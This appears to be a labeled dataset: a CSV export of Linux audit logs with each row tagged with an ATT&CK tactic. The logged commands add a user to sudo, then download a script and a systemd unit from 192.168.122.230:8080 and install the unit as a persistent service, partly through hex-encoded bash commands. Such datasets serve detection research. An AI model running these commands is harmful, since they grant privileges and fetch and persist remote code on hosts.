@timestamp,a0,a1,a10,a2,a3,a4,a5,a6,a7,a8,a9,command_executed,event.original,host.name,message,sequence,tactic,technique
"Sep 27, 2024 @ 15:08:58.537",usermod,#NAME?,-,sudo,support_388945a0,-,-,-,-,-,-,usermod -aG sudo support_388945a0,"type=EXECVE msg=audit(1727449731.038:341346): argc=4 a0=""usermod"" a1=""-aG"" a2=""sudo"" a3=""support_388945a0""",04472f17f8ed,"type=EXECVE msg=audit(1727449731.038:341346): argc=4 a0=""usermod"" a1=""-aG"" a2=""sudo"" a3=""support_388945a0""",341346,persistence,Account Manipulation
"Sep 27, 2024 @ 15:09:53.542",sh,-c,-,-,-,-,-,-,-,-,-,sh -c,"type=EXECVE msg=audit(1727449792.030:341357): argc=3 a0=""sh"" a1=""-c"" a2=2F62696E2F62617368202D6320276375726C202D6F202F746D702F6D792D637573746F6D2E7365727669636520687474703A2F2F3139322E3136382E3132322E3233303A383038302F6D792D637573746F6D2E736572766963653B206375726C202D6F202F746D702F6D792D7363726970742E736820687474703A2F2F3139322E3136382E3132322E3233303A383038302F6D792D7363726970742E73683B2063686D6F64202B78202F746D702F6D792D7363726970742E73683B207375646F206D76202F746D702F6D792D637573746F6D2E73657276696365202F6574632F73797374656D642F73797374656D2F6D792D637573746F6D2E736572766963653B207375646F2073797374656D63746C206461656D6F6E2D72656C6F61643B207375646F2073797374656D63746C20656E61626C65206D792D637573746F6D2E736572766963653B207375646F2073797374656D63746C207374617274206D792D637573746F6D2E736572766963653B206563686F20225365727669636520696E697469616C69736564223B27",04472f17f8ed,"type=EXECVE msg=audit(1727449792.030:341357): argc=3 a0=""sh"" a1=""-c"" a2=2F62696E2F62617368202D6320276375726C202D6F202F746D702F6D792D637573746F6D2E7365727669636520687474703A2F2F3139322E3136382E3132322E3233303A383038302F6D792D637573746F6D2E736572766963653B206375726C202D6F202F746D702F6D792D7363726970742E736820687474703A2F2F3139322E3136382E3132322E3233303A383038302F6D792D7363726970742E73683B2063686D6F64202B78202F746D702F6D792D7363726970742E73683B207375646F206D76202F746D702F6D792D637573746F6D2E73657276696365202F6574632F73797374656D642F73797374656D2F6D792D637573746F6D2E736572766963653B207375646F2073797374656D63746C206461656D6F6E2D72656C6F61643B207375646F2073797374656D63746C20656E61626C65206D792D637573746F6D2E736572766963653B207375646F2073797374656D63746C207374617274206D792D637573746F6D2E736572766963653B206563686F20225365727669636520696E697469616C69736564223B27",341357,-,-
"Sep 27, 2024 @ 15:09:53.543",curl,#NAME?,-,/tmp/my-custom.service,http://192.168.122.230:8080/my-custom.service,-,-,-,-,-,-,curl -o /tmp/my-custom.service http://192.168.122.230:8080/my-custom.service,"type=EXECVE msg=audit(1727449792.034:341359): argc=4 a0=""curl"" a1=""-o"" a2=""/tmp/my-custom.service"" a3=""http://192.168.122.230:8080/my-custom.service""",04472f17f8ed,"type=EXECVE msg=audit(1727449792.034:341359): argc=4 a0=""curl"" a1=""-o"" a2=""/tmp/my-custom.service"" a3=""http://192.168.122.230:8080/my-custom.service""",341359,privilege-escalation,Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
"Sep 27, 2024 @ 15:09:53.543",/bin/bash,-c,-,-,-,-,-,-,-,-,-,/bin/bash -c,"type=EXECVE msg=audit(1727449792.030:341358): argc=3 a0=""/bin/bash"" a1=""-c"" a2=6375726C202D6F202F746D702F6D792D637573746F6D2E7365727669636520687474703A2F2F3139322E3136382E3132322E3233303A383038302F6D792D637573746F6D2E736572766963653B206375726C202D6F202F746D702F6D792D7363726970742E736820687474703A2F2F3139322E3136382E3132322E3233303A383038302F6D792D7363726970742E73683B2063686D6F64202B78202F746D702F6D792D7363726970742E73683B207375646F206D76202F746D702F6D792D637573746F6D2E73657276696365202F6574632F73797374656D642F73797374656D2F6D792D637573746F6D2E736572766963653B207375646F2073797374656D63746C206461656D6F6E2D72656C6F61643B207375646F2073797374656D63746C20656E61626C65206D792D637573746F6D2E736572766963653B207375646F2073797374656D63746C207374617274206D792D637573746F6D2E736572766963653B206563686F20225365727669636520696E697469616C69736564223B",04472f17f8ed,"type=EXECVE msg=audit(1727449792.030:341358): argc=3 a0=""/bin/bash"" a1=""-c"" a2=6375726C202D6F202F746D702F6D792D637573746F6D2E7365727669636520687474703A2F2F3139322E3136382E3132322E3233303A383038302F6D792D637573746F6D2E736572766963653B206375726C202D6F202F746D702F6D792D7363726970742E736820687474703A2F2F3139322E3136382E3132322E3233303A383038302F6D792D7363726970742E73683B2063686D6F64202B78202F746D702F6D792D7363726970742E73683B207375646F206D76202F746D702F6D792D637573746F6D2E73657276696365202F6574632F73797374656D642F73797374656D2F6D792D637573746F6D2E736572766963653B207375646F2073797374656D63746C206461656D6F6E2D72656C6F61643B207375646F2073797374656D63746C20656E61626C65206D792D637573746F6D2E736572766963653B207375646F2073797374656D63746C207374617274206D792D637573746F6D2E736572766963653B206563686F20225365727669636520696E697469616C69736564223B",341358,-,-
"Sep 27, 2024 @ 15:09:53.544",chmod,#NAME?,-,/tmp/my-script.sh,-,-,-,-,-,-,-,chmod +x /tmp/my-script.sh,"type=EXECVE msg=audit(1727449792.098:341363): argc=3 a0=""chmod"" a1=""+x"" a2=""/tmp/my-script.sh""",04472f17f8ed,"type=EXECVE msg=audit(1727449792.098:341363): argc=3 a0=""chmod"" a1=""+x"" a2=""/tmp/my-script.sh""",341363,privilege-escalation,Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
"Sep 27, 2024 @ 15:09:53.544",curl,#NAME?,-,/tmp/my-script.sh,http://192.168.122.230:8080/my-script.sh,-,-,-,-,-,-,curl -o /tmp/my-script.sh http://192.168.122.230:8080/my-script.sh,"type=EXECVE msg=audit(1727449792.066:341361): argc=4 a0=""curl"" a1=""-o"" a2=""/tmp/my-script.sh"" a3=""http://192.168.122.230:8080/my-script.sh""",04472f17f8ed,"type=EXECVE msg=audit(1727449792.066:341361): argc=4 a0=""curl"" a1=""-o"" a2=""/tmp/my-script.sh"" a3=""http://192.168.122.230:8080/my-script.sh""",341361,privilege-escalation,Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
"Sep 27, 2024 @ 15:09:53.545",sudo,mv,-,/tmp/my-custom.service,/etc/systemd/system/my-custom.service,-,-,-,-,-,-,sudo mv /tmp/my-custom.service /etc/systemd/system/my-custom.service,"type=EXECVE msg=audit(1727449792.102:341365): argc=4 a0=""sudo"" a1=""mv"" a2=""/tmp/my-custom.service"" a3=""/etc/systemd/system/my-custom.service""",04472f17f8ed,"type=EXECVE msg=audit(1727449792.102:341365): argc=4 a0=""sudo"" a1=""mv"" a2=""/tmp/my-custom.service"" a3=""/etc/systemd/system/my-custom.service""",341365,privilege-escalation,Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
"Sep 27, 2024 @ 15:09:53.546",mv,/tmp/my-custom.service,-,/etc/systemd/system/my-custom.service,-,-,-,-,-,-,-,mv /tmp/my-custom.service /etc/systemd/system/my-custom.service,"type=EXECVE msg=audit(1727449792.142:341370): argc=3 a0=""mv"" a1=""/tmp/my-custom.service"" a2=""/etc/systemd/system/my-custom.service""",04472f17f8ed,"type=EXECVE msg=audit(1727449792.142:341370): argc=3 a0=""mv"" a1=""/tmp/my-custom.service"" a2=""/etc/systemd/system/my-custom.service""",341370,privilege-escalation,Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
"Sep 27, 2024 @ 15:09:53.547",sudo,systemctl,-,daemon-reload,-,-,-,-,-,-,-,sudo systemctl daemon-reload,"type=EXECVE msg=audit(1727449792.146:341374): argc=3 a0=""sudo"" a1=""systemctl"" a2=""daemon-reload""",04472f17f8ed,"type=EXECVE msg=audit(1727449792.146:341374): argc=3 a0=""sudo"" a1=""systemctl"" a2=""daemon-reload""",341374,-,-
"Sep 27, 2024 @ 15:09:53.548",systemctl,daemon-reload,-,-,-,-,-,-,-,-,-,systemctl daemon-reload,"type=EXECVE msg=audit(1727449792.162:341379): argc=2 a0=""systemctl"" a1=""daemon-reload""",04472f17f8ed,"type=EXECVE msg=audit(1727449792.162:341379): argc=2 a0=""systemctl"" a1=""daemon-reload""",341379,-,-
